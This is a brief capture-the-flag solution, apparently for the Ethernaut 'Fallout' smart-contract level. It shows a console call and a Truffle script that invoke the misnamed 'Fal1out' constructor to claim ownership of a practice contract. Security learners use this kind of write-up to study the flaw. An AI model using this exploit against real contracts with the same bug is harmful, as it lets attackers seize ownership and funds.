### Method one
we can run the code in Developer Tools:
~~~
await contract.Fal1out();
~~~


### Method two
truffle script:
~~~
module.exports = async function(callback) {
	player='your address'
	Fallout='your instance address'
	sig=web3.eth.abi.encodeFunctionCall({
		name:'Fal1out',
		type:'function',
        inputs:[]},
        []
	)
	console.log(await web3.eth.sendTransaction({from:player,to:Fallout,data:sig}))
	callback();
}
~~~